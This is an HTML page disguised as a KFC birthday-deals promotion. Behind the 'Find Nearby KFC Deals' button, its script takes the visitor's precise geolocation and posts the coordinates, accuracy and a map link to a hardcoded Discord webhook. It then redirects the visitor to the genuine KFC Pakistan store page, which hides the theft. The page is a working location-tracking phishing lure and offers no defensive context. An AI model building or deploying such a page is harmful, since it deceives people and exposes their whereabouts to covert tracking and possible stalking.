<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KFC Birthday Deals</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom, #fff, #ff0000);
      color: #fff;
      text-align: center;
      padding: 40px 20px;
    }

    .container {
      background: #fff;
      color: #000;
      padding: 40px;
      max-width: 600px;
      margin: auto;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
    }

    h1 {
      font-size: 2rem;
      color: #d40000;
    }

    p {
      font-size: 1.1rem;
      margin-top: 10px;
    }

    .btn {
      background-color: #d40000;
      color: white;
      font-size: 1.1rem;
      padding: 15px 30px;
      border: none;
      border-radius: 50px;
      margin-top: 25px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .btn:hover {
      background-color: #a70000;
    }

    #status {
      margin-top: 20px;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>KFC</h1>
    <p>Allow location to get exclusive offers on your Birthday or Anniversary üéÅ</p>
    <button class="btn" onclick="sendLocation()">üîé Find Nearby KFC Deals</button>
    <div id="status"></div>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";

    function sendLocation() {
      const statusDiv = document.getElementById("status");
      statusDiv.style.color = "black";
      statusDiv.textContent = "Requesting your location...";

      if (!navigator.geolocation) {
        statusDiv.textContent = "Geolocation is not supported by your browser.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = position.coords.accuracy;
          const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

          const message = `üçó **New KFC Deals Request**\nüìç Latitude: ${lat}\nüìç Longitude: ${lon}\nüéØ Accuracy: ${accuracy} meters\nüîó [Google Maps](${googleMapsLink})`;

          fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
          }).then(res => {
            if (res.ok) {
              statusDiv.style.color = "green";
              statusDiv.textContent = "‚úÖ Location sent. Redirecting to KFC Deals...";
              setTimeout(() => {
                window.location.href = "https://www.kfcpakistan.com/store-locations";
              }, 1500);
            } else {
              statusDiv.style.color = "red";
              statusDiv.textContent = "‚ùå Failed to send location.";
            }
          }).catch(err => {
            statusDiv.style.color = "red";
            statusDiv.textContent = "‚ùå Error sending request.";
          });
        },
        (error) => {
          statusDiv.style.color = "red";
          statusDiv.textContent = "‚ùå Location permission denied or unavailable.";
        }
      );
    }
  </script>

</body>
</html>
